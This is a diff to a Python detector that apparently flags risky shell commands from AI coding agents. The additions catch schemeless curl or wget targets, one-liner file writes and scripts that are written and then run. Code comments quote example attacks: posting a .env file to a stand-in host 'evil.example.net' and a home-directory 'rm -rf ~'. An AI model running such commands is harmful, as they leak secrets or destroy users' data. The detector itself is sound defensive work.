@@ -40,6 +40,7 @@ import json
 import os
 import pathlib
 import re
+import shlex
 import sys
 import tempfile
 from dataclasses import asdict, dataclass, field
@@ -179,12 +180,81 @@ def _hosts(text: str) -> list[str]:
     found += [m.group(2) for m in _SOCKET_TARGET.finditer(text)]
     if re.search(r"\bsocat\b", text, re.I):
         found += [m.group(1) for m in _SOCAT_ADDR.finditer(text)]
+    found += _schemeless_targets(text)
     out = []
     for h in found:
         h = (h or "").strip().strip("[]").lower().rstrip(".")
         if h and _HOSTLIKE.fullmatch(h):
             out.append(h)
     return list(dict.fromkeys(out))
+
+
+# HTTP clients whose target may be written without a scheme (`curl -d @.env evil.example.net`).
+_HTTP_CLIENT_WORD = re.compile(r"(?:curl|curlie|wget|xh|http|https)", re.I)
+# Options whose NEXT argument is a value (a file, header, body, method...), never the target. Per
+# client and case-sensitive: curl's -f and -O are flags, while wget's -O takes a file.
+_CURL_VALUE_OPTS = frozenset({
+    "-o", "--output", "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii",
+    "--json", "-H", "--header", "-u", "--user", "-x", "--proxy", "-F", "--form", "--form-string", "-T",
+    "--upload-file", "-e", "--referer", "-A", "--user-agent", "-b", "--cookie", "-c", "--cookie-jar",
+    "-X", "--request", "-w", "--write-out", "-K", "--config", "-m", "--max-time", "--connect-timeout",
+    "--cacert", "--cert", "--key", "--capath", "-E", "--resolve", "--connect-to", "-r", "--range",
+    "--retry", "-C", "--continue-at",
+})
+_WGET_VALUE_OPTS = frozenset({
+    "-O", "--output-document", "-o", "--output-file", "-a", "--append-output", "-P", "--directory-prefix",
+    "-U", "--user-agent", "--header", "--post-data", "--post-file", "--body-data", "--body-file",
+    "--method", "-t", "--tries", "-T", "--timeout", "--user", "--password", "-e", "--execute", "-i",
+    "--input-file", "-B", "--base", "--ca-certificate", "--certificate", "--private-key",
+})
+_HTTPIE_VALUE_OPTS = frozenset({"-o", "--output", "-a", "--auth", "--session", "--verify", "--cert",
+                                "--cert-key", "--timeout", "--proxy"})
+
+
+def _value_opts(client: str) -> frozenset:
+    c = client.lower()
+    if c.startswith("curl"):
+        return _CURL_VALUE_OPTS
+    return _WGET_VALUE_OPTS if c == "wget" else _HTTPIE_VALUE_OPTS
+_REDIRECTS = frozenset({">", ">>", "<", "1>", "2>", "&>", ">|"})
+_BARE_TARGET = re.compile(
+    r"(?:[\w.\-]+@)?((?:[a-z0-9\-]+\.)+[a-z]{2,24}|\d{1,3}(?:\.\d{1,3}){3})(?::\d{1,5})?(?:[/?#]\S*)?", re.I)
+
+
+def _split_args(segment: str) -> list[str]:
+    try:
+        return shlex.split(segment)
+    except ValueError:  # unbalanced quotes: fall back to whitespace
+        return segment.split()
+
+
+def _schemeless_targets(text: str) -> list[str]:
+    """Hosts an HTTP client is pointed at without a scheme. Option values (`-o out.json`, `-H ...`),
+    redirect targets and `@file` / `k=v` arguments are never targets."""
+    found = []
+    for seg in _segments(text):
+        toks = _split_args(seg)
+        start = next((i for i, t in enumerate(toks) if _HTTP_CLIENT_WORD.fullmatch(t)), None)
+        if start is None:
+            continue
+        opts = _value_opts(toks[start])
+        skip = False
+        for tok in toks[start + 1:]:
+            if skip:
+                skip = False
+                continue
+            if tok in _REDIRECTS:
+                skip = True
+                continue
+            if tok.startswith("-"):
+                skip = tok in opts
+                continue
+            if "://" in tok or "=" in tok or tok.startswith(("@", ">", "<", "$")):
+                continue
+            m = _BARE_TARGET.fullmatch(tok)
+            if m:
+                found.append(m.group(1))
+    return found
 
 
 def _as_ip(h: str) -> ipaddress.IPv4Address | ipaddress.IPv6Address | None:
@@ -561,10 +631,24 @@ _GUARD_REMOVE = re.compile(
 _COPY_TO = re.compile(r"(?<![\w.\-])(?:cp|copy|Copy-Item|cpi|rsync|install)(?![\w-])", re.I)
 
 
+# File writes/deletes from a python/node/ruby/perl one-liner — reads (open(p), readFileSync) don't count.
+_LANG_WRITE = re.compile(
+    r"open\([^)]*,\s*['\"][wax]|open\([^)]*,\s*['\"]r\+|\bwrite_(?:text|bytes)\(|\b(?:write|append)File(?:Sync)?\("
+    r"|\bcreateWriteStream\(|\b(?:os|shutil)\.(?:remove|unlink|rmdir|removedirs|rename|replace|rmtree|move"
+    r"|copy\w*|chmod)\(|\.(?:unlink|rename|replace|touch|rmdir)\(|\b(?:unlink|rm|rmdir|rename)(?:Sync)?\("
+    r"|\bFile\.(?:write|delete|unlink|rename)\b|\bFileUtils\.\w+", re.I)
+
+
+def _one_liner_writes(code: str) -> bool:
+    return bool(_ONE_LINER.search(code)) and bool(_LANG_WRITE.search(code))
+
+
 def _tampers_with_guard(code: str) -> bool:
     if ".fusion" not in code.lower():
         return False
     if _REDIRECT_TO_GUARD.search(code):
+        return True
+    if _GUARD_FILE.search(code) and _one_liner_writes(code):
         return True
     for seg in _segments(code):
         file, whole = _GUARD_FILE.search(seg), _GUARD_DIR.search(seg)
@@ -734,6 +818,51 @@ def _db_is_local(text: str) -> bool:
     return dev_names or bool(re.search(r"\b(?:sqlite3?|duckdb)\b", text, re.I))
 
 
+# A script the command writes and then runs (`echo 'rm -rf ~' > x.sh && bash x.sh`): the written text
+# is code, not inert text, so it is analysed like the rest of the command.
+_ECHO_TO_FILE = re.compile(
+    r"(?:^|[|;&\n(]\s*)(echo(?:\s+-[neE]+)*|printf)\s+('[^']*'|\"(?:[^\"\\]|\\.)*\"|[^>|;&\n]+?)\s*>{1,2}\s*"
+    r"['\"]?([^\s'\";|&<>]+)", re.I)
+_HEREDOC_OPEN = re.compile(r"\bcat\b[^\n]*<<-?\s*['\"]?([A-Za-z_]\w*)")
+_HEREDOC_FILE = re.compile(r"(?<!<)>{1,2}\s*['\"]?([^\s'\";|&<>]+)")
+_MAX_SCRIPTS = 20
+
+
+def _written_scripts(cmd: str) -> dict[str, str]:
+    """{file: text} for files the command writes with echo/printf or a `cat` heredoc (linear time)."""
+    out: dict[str, str] = {}
+    for m in _ECHO_TO_FILE.finditer(cmd):
+        body = m.group(2).strip()
+        if body[:1] in ("'", '"') and body[-1:] == body[:1]:
+            body = body[1:-1]
+        if m.group(1).lower().startswith("printf") or re.search(r"-\w*e", m.group(1)):
+            body = body.replace("\\n", "\n").replace("\\t", "\t")
+        out.setdefault(m.group(3), body)
+        if len(out) >= _MAX_SCRIPTS:
+            return out
+    lines = cmd.split("\n")
+    i = 0
+    while i < len(lines) and len(out) < _MAX_SCRIPTS:
+        tag, file = _HEREDOC_OPEN.search(lines[i]), _HEREDOC_FILE.search(lines[i])
+        if tag and file:
+            end = next((j for j in range(i + 1, len(lines)) if lines[j].strip() == tag.group(1)), len(lines))
+            out.setdefault(file.group(1), "\n".join(lines[i + 1:end]))
+            i = end
+        i += 1
+    return out
+
+
+def _scripts_written_then_run(cmd: str) -> list[str]:
+    bodies = []
+    for file, body in _written_scripts(cmd).items():
+        name = re.escape(file[2:] if file.startswith("./") else file)
+        run = re.compile(r"(?:^|[|;&\n(]\s*)(?:(?:sudo|nohup|time|exec)\s+)*(?:(?:bash|sh|zsh|dash|ksh|source)"
+                         r"\s+(?:-\w+\s+)*|\.\s+)?(?:\./)?['\"]?" + name + r"['\"]?(?=\s|$|[|;&)])")
+        if run.search(cmd):
+            bodies.append(body)
+    return bodies
+
+
 def analyze_bash(command: str, allow: list[str]) -> list[Finding]:
     cmd = str(command or "")
     if len(cmd) <= MAX_ANALYZED:
@@ -758,6 +887,8 @@ def _dedupe(found: list[Finding]) -> list[Finding]:
 def _analyze_bash(cmd: str, allow: list[str]) -> list[Finding]:
     out: list[Finding] = []
     code = _code_view(cmd)  # inert text (commit messages, grep patterns, file bodies) removed
+    for body in _scripts_written_then_run(cmd):  # ...unless the command writes it and then runs it
+        code += "\n" + body
     hosts = _hosts(cmd)
     external = [h for h in hosts if not is_internal(h, allow)]
     payload = _strip_auth_files(cmd)
@@ -833,7 +964,7 @@ def _analyze_bash(cmd: str, allow: list[str]) -> list[Finding]:
         out.append(Finding("persist.autostart", "medium",
                            "installs something that runs automatically (cron / shell rc / autorun / service)",
                            "excessive_agency", "LLM06"))
-    if _CLAUDE_SETTINGS.search(code) and _WRITES.search(code):
+    if _CLAUDE_SETTINGS.search(code) and (_WRITES.search(code) or _one_liner_writes(code)):
         out.append(Finding("tamper.claude_settings", "medium",
                            "modifies Claude Code settings (permissions / hooks) from a shell command",
                            "excessive_agency", "LLM06"))
